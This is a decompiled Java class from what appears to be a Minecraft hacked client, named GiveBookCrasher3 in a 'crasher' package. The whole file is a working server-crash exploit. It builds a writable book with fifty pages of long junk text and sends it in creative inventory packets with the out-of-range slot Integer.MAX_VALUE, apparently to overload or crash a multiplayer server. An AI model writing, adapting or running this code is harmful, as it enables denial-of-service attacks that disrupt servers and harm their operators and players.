// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.gbc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import me.amkgre.bettercraft.client.utils.TimeHelperUtils;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.client.Minecraft;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class GiveBookCrasher3
{
    public static double packets;
    
    static {
        GiveBookCrasher3.packets = 10.0;
    }
    
    public static void start() {
        final ItemStack stack = new ItemStack(Items.WRITABLE_BOOK);
        Minecraft.getMinecraft();
        final String author = Minecraft.getSession().getUsername();
        final String title = "Play with me.";
        final String pageContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
        final NBTTagCompound tag = new NBTTagCompound();
        final NBTTagList list2 = new NBTTagList();
        for (int limiter = 0; limiter < 50; ++limiter) {
            final NBTTagString tString = new NBTTagString(pageContent);
            list2.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list2);
        stack.setTagInfo("pages", list2);
        stack.setTagCompound(tag);
        final TimeHelperUtils var10 = new TimeHelperUtils();
        long var11 = 0L;
        for (int j = 0; j < GiveBookCrasher3.packets; ++j) {
            if (TimeHelperUtils.hasReached(var11)) {
                TimeHelperUtils.resets();
                var11 = 1000L;
                Minecraft.getMinecraft().player.connection.sendPacket(new CPacketCreativeInventoryAction(Integer.MAX_VALUE, stack));
            }
        }
    }
}
